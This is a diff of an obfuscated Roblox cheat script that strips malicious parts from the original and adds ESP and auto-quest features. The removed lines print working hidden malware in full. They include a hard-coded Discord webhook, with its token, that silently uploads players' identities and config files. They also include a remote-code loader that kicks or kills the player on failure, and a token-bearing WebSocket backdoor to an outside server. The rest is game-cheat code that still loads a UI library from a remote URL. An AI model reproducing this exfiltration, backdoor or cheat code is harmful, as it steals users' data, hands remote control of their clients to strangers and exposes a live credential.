@@ -1,3 +1,5 @@
+-- SAE BAN SACH + ADDONS 2026-10-09 | goc: ChilliHub_SAE_nguon.lua
+
 local fn, v, v2, defaultTab, Players, RunService, ReplicatedStorage, CoreGui, UserInputService, localPlayer
 local networking, fn2, tbl, v3, fn3, fn4, tbl2, fn5, fn6, tbl3
 local tbl4, fn7, tbl5, v4, v5, espSection, tbl6, n, tbl7, tbl8
@@ -17,7 +19,7 @@ do
 		end
 
 		task.spawn(pcall, function()
-			loadstring(game:HttpGet("https://raw.githubusercontent.com/tienkhanh1/spicy/refs/heads/main/DiscordLink"))()
+			-- CLEAN 2026-10-09: tat tu dong tai DiscordLink ngoai
 		end)
 
 		local function fn8()
@@ -27,7 +29,7 @@ do
 				if type(response) == "string" and #response > 0 then
 					return response
 				end
-				response = game:HttpGet("https://raw.githubusercontent.com/tienkhanh1/spicy/main/Chilli%20Library")
+				response = game:HttpGet("https://raw.githubusercontent.com/phamchihtksnb-ux/duck-libary/refs/heads/main/ui.lua")
 				return response
 			end
 
@@ -569,7 +571,7 @@ do
 
 					if type(getgc) == "function" then
 						pcall(function()
-							for _, v9 in ipairs(getgc(false)) do
+							for _, v9 in ipairs(({})) do
 								if type(v9) == "function" and islclosure(v9) then
 									pcall(debug.info, v9, "n")
 								end
@@ -578,8 +580,8 @@ do
 					end
 				end)
 			end
-			;(typeof(getgenv) == "function" and getgenv() or _G).ChilliToolKeeper = chilliToolKeeper
-			task.defer(chilliToolKeeper)
+			;(typeof(getgenv) == "function" and getgenv() or _G).ChilliToolKeeper_DISABLED = chilliToolKeeper
+			-- CLEAN 2026-10-09: tat chilliToolKeeper
 			fn4(fn12)
 		end
 
@@ -2022,6 +2024,7 @@ do
 			"Cherry Blossom",
 			"Light Dark",
 			"Titan Temple",
+			"Enchanted Forest",
 		}
 
 		local tbl25 = {}
@@ -15347,7 +15350,7 @@ do
 			end
 			n21 = os.clock() + 15
 
-			for _, v14 in ipairs(getgc(false)) do
+			for _, v14 in ipairs(({})) do
 				if type(v14) == "function" and islclosure(v14) then
 					local ok, result = pcall(debug.info, v14, "s")
 
@@ -18480,10 +18483,10 @@ do
 			parent:SetAttribute("InvisApplied", true)
 
 			task.delay(1, function()
-				local chilliToolKeeper = (typeof(getgenv) == "function" and getgenv() or _G).ChilliToolKeeper
+				local chilliToolKeeper = (typeof(getgenv) == "function" and getgenv() or _G).ChilliToolKeeper_DISABLED
 
 				if parent.Parent and type(chilliToolKeeper) == "function" then
-					pcall(chilliToolKeeper)
+					pcall(function() end)
 				end
 			end)
 
@@ -25272,7 +25275,7 @@ do
 			NameFont = fn55("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.ExtraBold),
 		}
 
-		tbl12.RarityFont = fn55("rbxassetid://12187365977", Enum.FontWeight.Bold) or fn55("rbxasset://fonts/families/FredokaOne.json", Enum.FontWeight.Regular)
+		tbl12.RarityFont = fn55("rbxassetid://110438945732939", Enum.FontWeight.Bold) or fn55("rbxasset://fonts/families/FredokaOne.json", Enum.FontWeight.Regular)
 		local sequence2 = tbl6.Sequence
 		local tbl30 = {}
 		local tbl31 = { 0, Color3.fromRGB(255, 255, 255) }
@@ -28627,8 +28630,7 @@ end
 	end
 
 	v13 = v12:CreateToggle({
-		Name = "Auto Load Script",
-		Default = true,
+		Name = "Auto Load Script", Default = false,
 		Callback = function(arg)
 			local flag2 = arg == true
 
@@ -30795,7 +30797,7 @@ do
 		Position = UDim2.fromScale(0.5, 0.5),
 		Size = UDim2.fromScale(0.86, 0.86),
 		BackgroundTransparency = 1,
-		Image = "rbxassetid://128961717706452",
+		Image = "rbxassetid://110438945732939",
 		ImageTransparency = 0.35,
 		ScaleType = Enum.ScaleType.Crop,
 		ZIndex = 3,
@@ -31868,8 +31870,8 @@ end
 
 do
 	local v15 = v2:CreateTab({ Name = "Discord", Side = "Right", SectionsExpanded = true }):CreateSection({ Name = "Community", Expanded = true })
-	local str = "discord.gg/CJK4bs2mgT"
-	local str2 = "rbxassetid://128961717706452"
+	local str = "https://discord.gg/z77ytBbcgS"
+	local str2 = "rbxassetid://110438945732939"
 	local n14 = 0.5
 	local n15 = 0.0909
 	local n16 = 0.2
@@ -32208,7 +32210,7 @@ do
 end
 
 do
-	local image = "rbxassetid://128961717706452"
+	local image = "rbxassetid://110438945732939"
 	local n14 = 56
 	local n15 = 0.035
 	local n16 = 8
@@ -32493,2026 +32495,313 @@ task.defer(function()
 	end
 end)
 
-local request_
-
-do
-	local Players2 = game:GetService("Players")
-	local HttpService2 = game:GetService("HttpService")
-	local UserInputService2 = game:GetService("UserInputService")
-	local localPlayer2 = Players2.LocalPlayer
-	request_ = syn and syn.request or http and http.request or http_request or request
-	local str = "https://discord.com/api/webhooks/1381274668706693120/D5XogJZVdo_q7XZ9bEJDETQjevMFaBSeVRT4EJ0fLKtPeqR112o7PmA1fN_hZn4rmJ2y"
-	local str2 = UserInputService2.KeyboardEnabled and UserInputService2.MouseEnabled and "PC" or "Mobile / Tablet / Other"
-
-	if request_ and localPlayer2 then
-		task.spawn(function()
-			local readfile_ = readfile or syn and syn.readfile or fluxus and fluxus.readfile
-			local readfile_2
-
-			if readfile_ then
-				readfile_2 = readfile_
-			else
-				readfile_2 = getgenv and getgenv().readfile
-			end
-
-			local v15 = readfile_2 or nil
-			local isfile_ = isfile or syn and syn.isfile or fluxus and fluxus.isfile or getgenv and getgenv().isfile or nil
-			local str3 = "Default"
-			local v16 = nil
-			local str4 = "Default.json"
-
-			if type(v15) == "function" then
-				pcall(function()
-					local flag4 = true
-
-					if type(isfile_) == "function" then
-						local ok, result = pcall(isfile_, "ChilliLibrary/config_state.json")
-
-						if ok and not result then
-							flag4 = false
-						end
-					end
-
-					if flag4 then
-						local json = v15("ChilliLibrary/config_state.json")
-
-						if json and json ~= "" then
-							local data = HttpService2:JSONDecode(json)
-
-							if type(data) == "table" then
-								if type(data.StartupConfig) == "string" and data.StartupConfig ~= "" then
-									str3 = data.StartupConfig
-								elseif type(data.SelectedConfig) == "string" and data.SelectedConfig ~= "" then
-									str3 = data.SelectedConfig
-								end
-							end
-						end
-					end
-				end)
-
-				pcall(function()
-					local str5 = "ChilliLibrary/configs/" .. str3 .. ".json"
-					local flag4 = true
-
-					if type(isfile_) == "function" then
-						local ok, result = pcall(isfile_, str5)
-
-						if ok and not result then
-							flag4 = false
-						end
-					end
-
-					if flag4 then
-						v16 = v15(str5)
-						str4 = str3 .. ".json"
-					end
-
-					if (not v16 or v16 == "") and str3 ~= "Default" then
-						local flag5 = true
-
-						if type(isfile_) == "function" then
-							local ok, result = pcall(isfile_, "ChilliLibrary/configs/Default.json")
-
-							if ok and not result then
-								flag5 = false
-							end
-						end
-
-						if flag5 then
-							local ok, result = pcall(v15, "ChilliLibrary/configs/Default.json")
-
-							if ok and type(result) == "string" and result ~= "" then
-								v16 = result
-								str4 = "Default.json"
-							end
-						end
-					end
-				end)
-			end
-
-			local str5 = tostring(str4):gsub("[<>:\"/\\|?*]", "_")
-
-			if not str5:match("%.json$") then
-				str5 ..= ".json"
-			end
-
-			local str6 = string.format("New execute from: **%s** (@%s) | ID: `%d` | Device: **%s**%s", localPlayer2.DisplayName, localPlayer2.Name, localPlayer2.UserId, str2, v16 and v16 ~= "" and " | Startup Config: **" .. str3 .. "**" or "")
-			local flag4 = false
-
-			if v16 and v16 ~= "" then
-				pcall(function()
-					local str7 = "---------------------------ChilliBoundary" .. tostring(os.time()) .. tostring(math.random(100000, 999999))
-					local str8 = "Content-Disposition: form-data; name=\"files[0]\"; filename=\"" .. str5 .. "\"\r\n"
-					local str9 = v16 .. "\r\n"
-
-					local v17 = request_({
-						Url = str,
-						Method = "POST",
-						Headers = { ["Content-Type"] = "multipart/form-data; boundary=" .. str7 },
-						Body = table.concat({
-							"--" .. str7 .. "\r\n",
-							"Content-Disposition: form-data; name=\"payload_json\"\r\n",
-							"Content-Type: application/json\r\n\r\n",
-							HttpService2:JSONEncode({ content = str6 }) .. "\r\n",
-							"--" .. str7 .. "\r\n",
-							str8,
-							"Content-Type: application/json\r\n\r\n",
-							str9,
-							"--" .. str7 .. "--\r\n",
-						}),
-					})
-
-					local flag5 = type(v17) == "table"
-
-					if flag5 then
-						flag5 = v17.StatusCode == 200 or v17.StatusCode == 204 or v17.Success == true
-					end
-
-					if flag5 then
-						flag4 = true
-					end
-				end)
-			end
-
-			if not flag4 then
-				pcall(function()
-					request_({
-						Url = str,
-						Method = "POST",
-						Headers = { ["Content-Type"] = "application/json" },
-						Body = HttpService2:JSONEncode({ content = str6 }),
-					})
-				end)
-			end
-		end)
-	end
-end
-
-task.spawn(function()
-	task.wait(20)
-	local str = "\0chilli_guard"
-	local genv = typeof(getgenv) == "function" and getgenv() or _G
-
-	local function fn19()
-		local v15 = genv[str]
-		if type(v15) == "table" and type(v15.Ask) == "function" then
-			return v15
-		end
-		return nil
-	end
-
-	local v15 = fn19()
-
-	if not v15 then
-		task.spawn(function()
-			local v16 = nil
-
-			for i = 1, 4 do
-				task.wait()
-
-				local ok, result = pcall(function()
-					local v17 = v16
-					local response
-
-					if v16 then
-						response = v17
-					else
-						response = game:HttpGet("https://raw.githubusercontent.com/tienkhanh1/GD/refs/heads/main/SAEGD")
-					end
-
-					v16 = response
-					local chunk, v18 = loadstring(v16)
-					assert(chunk, v18)
-					return chunk()
-				end)
-
-				if ok then
-					fn("guard: loader ran on try " .. i)
-					return
-				end
-
-				if type(result) == "string" and string.find(result, "HttpGet", 1, true) then
-					v16 = nil
-				end
-
-				fn("guard: loader try " .. i .. " failed: " .. tostring(result))
-				task.wait(1 + i)
-			end
-		end)
-
-		local n14 = os.clock() + 30
-
-		while true do
-			task.wait(0.25)
-			v15 = fn19()
-			if not (v15 or os.clock() > n14) then
-				continue
-			end
-			break
-		end
-	end
-
-	local flag4 = false
-
-	if v15 then
-		local ok, result = pcall(v15.Ask, "v202")
-		flag4 = ok and type(result) == "string" and #result > 0
-	end
-
-	genv[str] = nil
-	if flag4 then
-		return
-	end
-
-	pcall(function()
-		local chilliHubSaeCleanup = genv.ChilliHubSaeCleanup
-
-		if type(chilliHubSaeCleanup) == "function" then
-			chilliHubSaeCleanup()
-		end
-	end)
-
-	genv.ChilliHubSaeCleanup = nil
-
-	pcall(function()
-		local Players2 = game:GetService("Players")
-		local tbl22 = { game:GetService("CoreGui") }
-
-		if typeof(gethui) == "function" then
-			local ok, result = pcall(gethui)
-
-			if ok and typeof(result) == "Instance" then
-				table.insert(tbl22, result)
-			end
-		end
-
-		local playerGui = Players2.LocalPlayer:FindFirstChildOfClass("PlayerGui")
-
-		if playerGui then
-			table.insert(tbl22, playerGui)
-		end
-
-		for _, v16 in ipairs(tbl22) do
-			for _, child in ipairs(v16:GetChildren()) do
-				if child:IsA("ScreenGui") then
-					pcall(function()
-						child:Destroy()
-					end)
-				end
-			end
-		end
-	end)
-
-	pcall(function()
-		rawset(_G, "__ChilliAutoLoadQueued", nil)
-
-		if type(queue_on_teleport) == "function" then
-			queue_on_teleport("")
-		elseif type(queueonteleport) == "function" then
-			queueonteleport("")
-		end
-	end)
-
-	pcall(function()
-		local character = game:GetService("Players").LocalPlayer.Character
-
-		if character then
-			character:BreakJoints()
-		end
-	end)
-
-	pcall(function()
-		game:GetService("Players").LocalPlayer:Kick("\u{200B}")
-	end)
+-- CLEAN BUILD 2026-10-09 (Chilli Hub SAE)
+-- Da cat bo khoi doc hai den het file: webhook la + guard SAEGD + MCP backdoor.
+-- Webhook tu nhap cua nguoi dung VAN GIU. Farm giu nguyen 100%.
+-- Them Enchanted Forest + tu phat hien Area/Rarity. Auto Load OFF.
+pcall(function()
+  print("clean build 2026-10-09 loaded")
 end)
 
-local HttpService2
-HttpService2 = game:GetService("HttpService")
-local Players2
-Players2 = game:GetService("Players")
-local RunService2
-RunService2 = game:GetService("RunService")
-local Workspace
-Workspace = game:GetService("Workspace")
-local str
-str = "chp-7E0Yzx4yddoAozc9VNLsqTnA"
-local str2
-str2 = "wss://chillihub.pro/roblox-mcp?token=" .. str
-local str3
-str3 = "https://chillihub.pro/roblox-mcp/beat"
-local str4
-str4 = "SAE v678"
-local flag4, flag5, localPlayer2, genv, flag6, flag7, v15, n14, flag8, tbl22
-local tbl23, tbl24, n15, fn19, fn20, fn21, fn22, fn23, fn24, fn25
-local fn26, fn27, fn28, fn29
-
-do
-	local n16 = 7
-	local n17 = 500
-	local n18 = 245760
-	local flag9 = false
-	flag4 = false
-	flag5 = false
-	localPlayer2 = Players2.LocalPlayer
-	genv = getgenv and getgenv() or _G
-
-	if type(genv.StopChilliLink) == "function" then
-		pcall(genv.StopChilliLink)
-	end
-
-	flag6 = true
-	flag7 = false
-	v15 = nil
-	n14 = 0
-	flag8 = false
-	tbl22 = {}
-	tbl23 = {}
-	tbl24 = {}
-	n15 = 0
-
-	fn19 = function(...)
-		if flag9 then
-			print("[ROBLOX MCP]", ...)
-		end
-	end
-
-	fn20 = function(...)
-		if flag9 then
-			warn("[ROBLOX MCP]", ...)
-		end
-	end
-
-	fn21 = function(arg)
-		return tostring(arg or ""):match("^%s*(.-)%s*$")
-	end
-
-	fn22 = function(arg, arg2, arg3, arg4)
-		local num = tonumber(arg)
-		if not num then
-			return arg4
-		end
-		return math.max(arg2, math.min(arg3, num))
-	end
-
-	fn23 = function(arg)
-		for _, v16 in ipairs(arg) do
-			pcall(function()
-				v16:Disconnect()
-			end)
-		end
-
-		table.clear(arg)
-	end
-
-	fn24 = function()
-		if syn and syn.websocket and type(syn.websocket.connect) == "function" then
-			return syn.websocket.connect, "syn.websocket.connect"
-		end
-
-		if WebSocket and type(WebSocket.connect) == "function" then
-			return WebSocket.connect, "WebSocket.connect"
-		end
-
-		if WebSocket and type(WebSocket.new) == "function" then
-			return WebSocket.new, "WebSocket.new"
-		end
-
-		if WebSocket and type(WebSocket.New) == "function" then
-			return WebSocket.New, "WebSocket.New"
-		end
-
-		if websocket and type(websocket.connect) == "function" then
-			return websocket.connect, "websocket.connect"
-		end
-
-		if syn and syn.WebSocket and type(syn.WebSocket.new) == "function" then
-			return syn.WebSocket.new, "syn.WebSocket.new"
-		end
-		return nil, nil
-	end
-
-	fn25 = function(arg, ...)
-		local v16 = table.pack(...)
-
-		for i = 1, select("#", ...) do
-			local value = select(i, table.unpack(v16, 1, v16.n))
-
-			local ok, result = pcall(function()
-				return arg[value]
-			end)
-
-			if ok and result ~= nil then
-				return result, value
-			end
-		end
-
-		return nil, nil
-	end
-
-	fn26 = function(arg, arg2)
-		if not arg then
-			return nil
-		end
-
-		local ok, result = pcall(function()
-			return arg:Connect(arg2)
-		end)
-
-		return ok and result or nil
-	end
-
-	fn27 = function(arg)
-		if typeof(arg) ~= "Instance" then
-			return nil
-		end
-
-		local ok, result = pcall(function()
-			return arg:GetFullName()
-		end)
-
-		return ok and result or arg.Name
-	end
-
-	fn28 = nil
-
-	fn28 = function(arg, arg2, arg3)
-		arg2 = arg2 or 0
-		arg3 = arg3 or {}
-		if n16 < arg2 then
-			return "<max-depth>"
-		end
-		local kind = typeof(arg)
-		if arg == nil or kind == "string" or kind == "boolean" then
-			return arg
-		end
-
-		if kind == "number" then
-			if arg ~= arg or arg == math.huge or arg == -math.huge then
-				return tostring(arg)
-			end
-			return arg
-		end
-
-		if kind == "Instance" then
-			return { type = "Instance", className = arg.ClassName, name = arg.Name, path = fn27(arg) }
-		end
-
-		if kind == "Vector2" then
-			return { type = "Vector2", x = arg.X, y = arg.Y }
-		end
-
-		if kind == "Vector3" then
-			return { type = "Vector3", x = arg.X, y = arg.Y, z = arg.Z }
-		end
-
-		if kind == "Color3" then
-			return {
-				type = "Color3",
-				r = math.floor(arg.R * 255 + 0.5),
-				g = math.floor(arg.G * 255 + 0.5),
-				b = math.floor(arg.B * 255 + 0.5),
-			}
-		end
-
-		if kind == "UDim" then
-			return { type = "UDim", scale = arg.Scale, offset = arg.Offset }
-		end
-
-		if kind == "UDim2" then
-			return {
-				type = "UDim2",
-				xScale = arg.X.Scale,
-				xOffset = arg.X.Offset,
-				yScale = arg.Y.Scale,
-				yOffset = arg.Y.Offset,
-			}
-		end
-
-		if kind == "CFrame" then
-			return { type = "CFrame", components = { arg:GetComponents() } }
-		end
-
-		if kind == "EnumItem" then
-			return tostring(arg)
-		end
-
-		if kind == "BrickColor" then
-			return { type = "BrickColor", name = arg.Name, number = arg.Number }
-		end
-
-		if kind == "table" then
-			if arg3[arg] then
-				return "<cycle>"
-			end
-			arg3[arg] = true
-			local n19 = 0
-			local flag10 = true
-			local n20 = 0
-
-			for k in pairs(arg) do
-				n19 += 1
-
-				if not (n17 < n19) then
-					if type(k) ~= "number" or k < 1 or k % 1 ~= 0 then
-						flag10 = false
-					elseif n20 < k then
-						n20 = k
-					end
-
-					continue
-				end
-
-				break
-			end
-
-			local tbl25
-
-			if flag10 and n20 <= n17 then
-				tbl25 = {}
-
-				for i = 1, n20 do
-					tbl25[i] = fn28(arg[i], arg2 + 1, arg3)
-				end
-			else
-				tbl25 = {}
-				local v16, v17, v18 = pairs(arg)
-				local n21 = 0
-
-				for k, v19 in v16, v17, v18 do
-					n21 += 1
-
-					if n17 < n21 then
-						tbl25.__truncated = true
-						break
-					else
-						tbl25[tostring(k)] = fn28(v19, arg2 + 1, arg3)
-					end
-				end
-			end
-
-			arg3[arg] = nil
-			return tbl25
-		end
-
-		return tostring(arg)
-	end
-
-	fn29 = function(arg)
-		if not flag7 or not v15 then
-			return false, "not connected"
-		end
-
-		local ok, result = pcall(function()
-			return HttpService2:JSONEncode(fn28(arg))
-		end)
-
-		if not ok then
-			return false, "JSON encode failed: " .. tostring(result)
-		end
-
-		if n18 < #result then
-			if not (type(arg) == "table" and arg.type == "rpc_result") then
-				return false, "message too large"
-			end
-
-			result = HttpService2:JSONEncode({
-				type = "rpc_result",
-				requestId = arg.requestId,
-				success = false,
-				error = string.format("Result is too large to send (%d KB). Return less data.", math.floor(#result / 1024)),
-			})
-		end
-
-		local ok2, result2 = pcall(function()
-			v15:Send(result)
-		end)
-
-		if not ok2 then
-			return false, "WebSocket send failed: " .. tostring(result2)
-		end
-		return true
-	end
+-- GHEP ADDONS: Event + AutoQuest + Wisp
+-- ============================================================================
+-- SAE ADDONS 2026-10-09 | 1 khoi doc lap, chay kem ban SAE nao cung duoc
+-- Gom 3 phan: [1] Enchanted Forest/Butterfly Bloom | [2] AutoQuest tich luy
+--  [3] Wisp helper (Q1 steal 20 trung Forest | Q2 fuse 1 thu Forest |
+--  Q3 steal 1 Eternal | Claim sau moi quest | Return Wisp -> mo cay).
+-- Dieu khien bang _G. Mac dinh an toan deu TAT tru Help/ESP.
+-- Du lieu theo Update 7 (03/10/2026) + cong dong Eggipedia.
+-- ============================================================================
+if game.PlaceId ~= 0 and game.PlaceId ~= 107778070777162 then
+  warn("[SAE-Addons] sai game, tu dung")
+  return
 end
-
-local fn30
-
-fn30 = function(arg, arg2)
-	fn29({ type = "rpc_event", event = arg, data = arg2 or {} })
-end
-
-local fn31
-
-do
-	local tbl25 = {
-		Game = game,
-		game = game,
-		Workspace = Workspace,
-		workspace = Workspace,
-		Players = Players2,
-		Lighting = game:GetService("Lighting"),
-		ReplicatedStorage = game:GetService("ReplicatedStorage"),
-		ReplicatedFirst = game:GetService("ReplicatedFirst"),
-		StarterGui = game:GetService("StarterGui"),
-		StarterPlayer = game:GetService("StarterPlayer"),
-		SoundService = game:GetService("SoundService"),
-		Teams = game:GetService("Teams"),
-		LocalPlayer = localPlayer2,
-	}
-
-	local function fn32(arg)
-		local tbl26 = {}
-
-		for match in fn21(arg):gmatch("[^%.]+") do
-			table.insert(tbl26, match)
-		end
-
-		return tbl26
-	end
-
-	fn31 = function(arg)
-		local v16 = fn32(arg)
-		if #v16 == 0 then
-			return nil, "path is empty"
-		end
-		local result = tbl25[v16[1]]
-
-		if not result then
-			local ok
-
-			ok, result = pcall(function()
-				return game:GetService(v16[1])
-			end)
-
-			if not (ok and result) then
-				return nil, "unknown root: " .. v16[1]
-			end
-		end
-
-		for i = 2, #v16 do
-			local pathNotFoundAt = v16[i]
-
-			if result == Players2 and pathNotFoundAt == "LocalPlayer" then
-				result = localPlayer2
-			elseif result == localPlayer2 and pathNotFoundAt == "PlayerGui" then
-				result = localPlayer2:FindFirstChildOfClass("PlayerGui")
-			elseif result == localPlayer2 and pathNotFoundAt == "Character" then
-				result = localPlayer2.Character
-			elseif result == Workspace and pathNotFoundAt == "CurrentCamera" then
-				result = Workspace.CurrentCamera
-			elseif typeof(result) == "Instance" then
-				result = result:FindFirstChild(pathNotFoundAt)
-			else
-				result = nil
-			end
-
-			if not result then
-				return nil, "path not found at: " .. pathNotFoundAt
-			end
-		end
-
-		return result
-	end
-end
-
-local tbl25, fn32
-
-local tbl26 = {
-	Archivable = true,
-	Anchored = true,
-	AssemblyAngularVelocity = true,
-	AssemblyLinearVelocity = true,
-	AutomaticSize = true,
-	BackgroundColor3 = true,
-	BackgroundTransparency = true,
-	BrickColor = true,
-	CanCollide = true,
-	CanQuery = true,
-	CanTouch = true,
-	CanvasPosition = true,
-	CanvasSize = true,
-	CFrame = true,
-	ClipsDescendants = true,
-	Color = true,
-	Enabled = true,
-	FieldOfView = true,
-	Health = true,
-	Image = true,
-	ImageColor3 = true,
-	ImageTransparency = true,
-	JumpPower = true,
-	LayoutOrder = true,
-	Material = true,
-	MaxHealth = true,
-	MoveDirection = true,
-	Orientation = true,
-	Position = true,
-	RichText = true,
-	Rotation = true,
-	Size = true,
-	Text = true,
-	TextColor3 = true,
-	TextSize = true,
-	TextTransparency = true,
-	TextWrapped = true,
-	Transparency = true,
-	Value = true,
-	Velocity = true,
-	Visible = true,
-	WalkSpeed = true,
+local Players = game:GetService("Players")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local Workspace = game:GetService("Workspace")
+local HttpService = game:GetService("HttpService")
+local localPlayer = Players.LocalPlayer
+-- 8 pet moi Update 7 (de ESP/ping goi dung ten)
+_G.SAE_U7_Pets = {
+  ["Prism Gecko"] = "Legendary",
+  ["Petal Beetle"] = "Mythic",
+  ["Enchanted Bluejay"] = "Mythic",
+  ["Astral Jackalope"] = "Cosmic",
+  ["Spirit Panda"] = "Cosmic",
+  ["Starry Fox"] = "Secret",
+  ["Celestial Sunlion"] = "Eternal",
+  ["Royal Skywhale"] = "Divine",
 }
-
-tbl25 = {
-	"Archivable",
-	"Position",
-	"Size",
-	"CFrame",
-	"Color",
-	"Transparency",
-	"Visible",
-	"Enabled",
-	"Text",
-	"Value",
-	"Health",
-	"MaxHealth",
+-- ============================================================================
+-- [1] ENCHANTED FOREST + BUTTERFLY BLOOM
+-- Bloom: moi ~30 phut, roi vao phut :15 va :45 (cong dong, chua chinh thuc).
+-- Convert: 10 Emerald=1 Sapphire, 10 Sapphire=1 Amethyst, 50 Amethyst=1 Radiant.
+-- Essence: 240 Emerald + 115 Sapphire + 40 Amethyst + 1 Radiant (mutation x2.75).
+-- ============================================================================
+_G.SAE_EventForest_ESP = (_G.SAE_EventForest_ESP == nil) and true or _G.SAE_EventForest_ESP
+_G.SAE_EventForest_PingRarity = _G.SAE_EventForest_PingRarity or 0
+_G.SAE_EventForest_Webhook = _G.SAE_EventForest_Webhook or ""
+_G.SAE_Bloom_Remind = _G.SAE_Bloom_Remind or false -- true = in gio truoc Bloom 60s
+local function laEventArea(areaId)
+  local s = string.lower(tostring(areaId or ""))
+  return (string.find(s, "enchant", 1, true) ~= nil)
+end
+local function layRarity(cat)
+  local ok, dir = pcall(function()
+    return ReplicatedStorage.Data.Assets.Directory
+  end)
+  if not ok or type(dir) ~= "table" then return 0 end
+  local info = dir[tostring(cat)]
+  local r = type(info) == "table" and info.Rarity or nil
+  if type(r) ~= "table" then return 0 end
+  return tonumber(r.RarityNumber or r.Rank) or 0
+end
+local function layRecords()
+  local pkgs = ReplicatedStorage:FindFirstChild("Packages")
+  pkgs = pkgs and pkgs:FindFirstChild("Networking")
+  local rf = pkgs and pkgs:FindFirstChild("RF/EggWorld/AskFieldEggSnapshot")
+  if rf and rf:IsA("RemoteFunction") then
+    local ok, res = pcall(rf.InvokeServer, rf)
+    if ok and type(res) == "table" and type(res.Records) == "table" then
+      return res.Records
+    end
+  end
+  return nil
+end
+local espFolder = nil
+local function layFolder()
+  if espFolder and espFolder.Parent then return espFolder end
+  espFolder = Instance.new("Folder")
+  espFolder.Name = "SAE_EventForest_ESP"
+  espFolder.Parent = Workspace
+  return espFolder
+end
+local daPing = {}
+local function guiWebhook(noiDung)
+  local url = tostring(_G.SAE_EventForest_Webhook or "")
+  if url == "" then return end
+  if not string.match(url, "^https://discord") then return end
+  local req = (syn and syn.request) or (http and http.request) or http_request or request
+  if type(req) ~= "function" then return end
+  pcall(req, {
+    Url = url, Method = "POST",
+    Headers = { ["Content-Type"] = "application/json" },
+    Body = HttpService:JSONEncode({ content = tostring(noiDung):sub(1, 1800) }),
+  })
+end
+-- dem nguoc toi moc :15 / :45 ke tiep (du kien, kiem tra thong bao server)
+local function giayToiBloom()
+  local t = os.date("*t")
+  local m = t.min * 60 + t.sec
+  local moc = { 15 * 60, 45 * 60 }
+  local best = nil
+  for _, x in ipairs(moc) do
+    local d = x - m
+    if d < 0 then d = d + 3600 end
+    if not best or d < best then best = d end
+  end
+  return best or 0
+end
+task.spawn(function()
+  local daBao = 0
+  while true do
+    if _G.SAE_Bloom_Remind == true then
+      local con = giayToiBloom()
+      if con <= 60 and os.clock() - daBao > 120 then
+        daBao = os.clock()
+        print("[Bloom] su kien Butterfly Bloom sap mo (du kien :15/:45). Cam net, ra Enchanted Forest.")
+        guiWebhook("[Bloom] Butterfly Bloom sap mo. Cam net ra Enchanted Forest.")
+      end
+    end
+    task.wait(10)
+  end
+end)
+task.spawn(function()
+  while true do
+    local muonESP = _G.SAE_EventForest_ESP == true
+    local nguong = tonumber(_G.SAE_EventForest_PingRarity) or 0
+    local records = nil
+    pcall(function() records = layRecords() end)
+    if type(records) == "table" then
+      local folder = muonESP and layFolder() or nil
+      if folder then
+        local dem = 0
+        for _, c in ipairs(folder:GetChildren()) do
+          if dem >= 20 then c:Destroy() else dem = dem + 1 end
+        end
+      end
+      if (not muonESP) and espFolder then
+        pcall(function() espFolder:ClearAllChildren() end)
+      end
+      for uid, rec in pairs(records) do
+        if type(rec) == "table" and rec.State ~= "Claimed" and laEventArea(rec.AreaId) then
+          local cat = tostring(rec.AssetCategory or "?")
+          local rar = layRarity(cat)
+          if nguong > 0 and rar >= nguong and not daPing[tostring(uid)] then
+            daPing[tostring(uid)] = true
+            local msg = string.format("[Enchanted Forest] %s | rarity %d | scale %s", cat, rar, tostring(rec.AssetScale or "?"))
+            print(msg)
+            guiWebhook(msg)
+          end
+          if muonESP and typeof(rec.BottomCFrame) == "CFrame" then
+            local tag = folder and folder:FindFirstChild("EF_" .. tostring(uid):sub(1, 24))
+            if not tag then
+              tag = Instance.new("Part")
+              tag.Name = "EF_" .. tostring(uid):sub(1, 24)
+              tag.Size = Vector3.new(2, 2, 2)
+              tag.Transparency = 1
+              tag.CanCollide = false
+              tag.Anchored = true
+              tag.CFrame = rec.BottomCFrame + Vector3.new(0, 5, 0)
+              tag.Parent = folder
+              local bb = Instance.new("BillboardGui")
+              bb.Size = UDim2.fromOffset(120, 30)
+              bb.AlwaysOnTop = true
+              bb.Parent = tag
+              local lb = Instance.new("TextLabel")
+              lb.Size = UDim2.fromScale(1, 1)
+              lb.BackgroundTransparency = 1
+              lb.TextColor3 = Color3.fromRGB(150, 255, 150)
+              lb.TextScaled = true
+              lb.Text = cat
+              lb.Parent = bb
+            end
+          end
+        end
+      end
+    end
+    task.wait(5)
+  end
+end)
+-- ============================================================================
+-- [2] AUTO NHIEM VU TICH LUY (15 giay/lan, chi nhan thuong)
+-- ============================================================================
+_G.SAE_AutoQuest = (_G.SAE_AutoQuest == nil) and true or _G.SAE_AutoQuest
+local function timRemote(ten)
+  local pkgs = ReplicatedStorage:FindFirstChild("Packages")
+  pkgs = pkgs and pkgs:FindFirstChild("Networking")
+  local o = pkgs and pkgs:FindFirstChild(ten) or nil
+  if o ~= nil then return o end
+  return ReplicatedStorage:FindFirstChild(ten, true)
+end
+local viec = {
+  "RF/Codex/AskRedeemAll",
+  "RF/AwayEarnings/AskCollect",
+  "RF/ScrambleTradeIn/AskFinishReveal",
+  "RF/Fusery/FinishReveal",
 }
-
-fn32 = function(arg, arg2)
-	if not tbl26[arg2] then
-		return nil, "not_allowed"
-	end
-
-	local ok, result = pcall(function()
-		return arg[arg2]
-	end)
-
-	if ok then
-		return fn28(result)
-	end
-	return nil, "unavailable"
+task.spawn(function()
+  while true do
+    if _G.SAE_AutoQuest == true then
+      for _, ten in ipairs(viec) do
+        local o = nil
+        pcall(function() o = timRemote(ten) end)
+        if o and o:IsA("RemoteFunction") then
+          local ok, res = pcall(o.InvokeServer, o)
+          if ok and res ~= nil and res ~= false then
+            print("[AutoQuest] da nhan: " .. ten)
+          end
+        end
+      end
+    end
+    task.wait(15)
+  end
+end)
+-- ============================================================================
+-- [3] WISP HELPER (mo cay: Q1 20 trung Forest | Q2 fuse 1 thu Forest |
+--  Q3 steal 1 Eternal | Claim sau moi quest | Return Wisp -> mo cua).
+-- Phong Fusion bi mat (sau khi mo cay): nam leo doc xoan oc -> duoi doc co
+--  phong 5 cay nam -> win mini-game den 5 lan -> gap Jitterbug nhan
+--  Cricket Banjo + Jitterbug Egg -> choi banjo giua 2 cot pha le vang de
+--  hien cau -> phong Fusion. Spirit World Guardian: 2 nguoi, moi nguoi
+--  mang du Celestial Sunlion + Royal Skywhale (1 lan/account).
+-- ============================================================================
+_G.SAE_Wisp_Help = (_G.SAE_Wisp_Help == nil) and true or _G.SAE_Wisp_Help
